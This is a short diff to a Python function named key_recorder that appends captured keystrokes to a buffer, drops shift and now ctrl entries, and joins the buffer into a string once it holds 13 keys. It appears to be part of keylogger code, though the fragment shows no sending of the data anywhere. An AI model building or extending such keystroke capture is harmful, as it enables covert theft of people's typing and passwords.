@@ -48,7 +48,9 @@ def key_recorder(key):
     
     a.append(key.replace("'",""))
     if key == 'Key.shift':
-        del a[-1]        
+        del a[-1]   
+    if key == 'Key.ctrl':
+        del a[-1]      
                          
     if len(a) == 13:
         listToStr = ''.join(map(str, a))
